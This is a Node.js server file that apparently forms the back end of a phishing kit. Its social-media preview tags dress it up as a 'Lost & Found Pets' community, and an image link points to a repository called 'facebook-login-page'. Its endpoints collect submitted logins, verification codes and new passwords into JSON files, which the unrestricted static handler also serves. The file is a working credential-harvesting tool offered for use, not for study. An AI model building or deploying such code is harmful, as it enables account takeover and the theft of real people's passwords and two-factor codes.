const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = 5000;

// Ensure required JSON files exist
const jsonFiles = ['db.json', 'code.json', 'passwordchangenumber.json', 'verifycode.json', 'newpass.json'];
jsonFiles.forEach(file => {
  if (!fs.existsSync(file)) {
    fs.writeFileSync(file, '[]');
  }
});

function serveStaticFile(res, filePath) {
  const extname = path.extname(filePath).toLowerCase();
  let contentType = 'text/html';

  // Define content types
  switch (extname) {
    case '.css':
      contentType = 'text/css';
      break;
    case '.js':
      contentType = 'text/javascript';
      break;
    case '.json':
      contentType = 'application/json';
      break;
    case '.png':
      contentType = 'image/png';
      break;
    case '.jpg':
    case '.jpeg':
      contentType = 'image/jpeg';
      break;
    case '.gif':
      contentType = 'image/gif';
      break;
    case '.svg':
      contentType = 'image/svg+xml';
      break;
    case '.ico':
      contentType = 'image/x-icon';
      break;
  }

  const isTextFile = ['.html', '.css', '.js', '.json'].includes(extname);

  fs.readFile(filePath, isTextFile ? 'utf8' : undefined, (err, content) => {
    if (err) {
      res.writeHead(404);
      res.end('File not found');
      return;
    }

    // Inject Open Graph & Twitter meta tags for HTML
    if (contentType === 'text/html') {
      const ogTags = `
      <meta property="og:title" content="Lost & Found Pets US" />
      <meta property="og:description" content="Join our community to help reunite lost pets with their families. Share sightings, post alerts, and get support from caring members who understand how important every pet is. Together, we can bring hope and happy endings to lost pets everywhere." />
      <meta property="og:image" content="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
      <meta property="og:image:width" content="1200" />
      <meta property="og:image:height" content="630" />
      <meta property="og:type" content="website" />
      <meta property="og:site_name" content="Florida Lost Pets" />
    
      <meta name="twitter:card" content="summary_large_image" />
      <meta name="twitter:title" content="Lost & Found Pets Florida" />
      <meta name="twitter:description" content="Join our community to help reunite lost pets with their families." />
      <meta name="twitter:image" content="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
    `;
    
      content = content.replace('</head>', `${ogTags}</head>`);
    }

    res.writeHead(200, { 'Content-Type': contentType });
    res.end(content);
  });
}

function saveToJson(filename, data) {
  try {
    let existingData = [];
    if (fs.existsSync(filename)) {
      const fileContent = fs.readFileSync(filename, 'utf8');
      if (fileContent.trim()) {
        try {
          const parsed = JSON.parse(fileContent);
          existingData = Array.isArray(parsed) ? parsed : [];
        } catch {
          existingData = [];
        }
      }
    }
    existingData.push({
      ...data,
      timestamp: new Date().toISOString()
    });
    fs.writeFileSync(filename, JSON.stringify(existingData, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving to JSON:', error);
    return false;
  }
}

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;

  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  if (req.method === 'POST') {
    let body = '';
    req.on('data', chunk => (body += chunk.toString()));

    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        let filename = '';

        switch (pathname) {
          case '/save-login':
            filename = 'db.json';
            break;
          case '/save-code':
            filename = 'code.json';
            break;
          case '/save-password-change':
            filename = 'passwordchangenumber.json';
            break;
          case '/save-verify-code':
            filename = 'verifycode.json';
            break;
          case '/save-new-password':
            filename = 'newpass.json';
            break;
          default:
            res.writeHead(404);
            res.end('Endpoint not found');
            return;
        }

        const success = saveToJson(filename, data);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success }));
      } catch (error) {
        res.writeHead(400);
        res.end('Invalid JSON');
      }
    });
    return;
  }

  // Serve static files
  if (pathname === '/' || pathname === '/index.html') {
    serveStaticFile(res, 'index.html');
  } else {
    const filePath = pathname.slice(1);
    if (fs.existsSync(filePath)) {
      serveStaticFile(res, filePath);
    } else {
      res.writeHead(404);
      res.end('File not found');
    }
  }
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
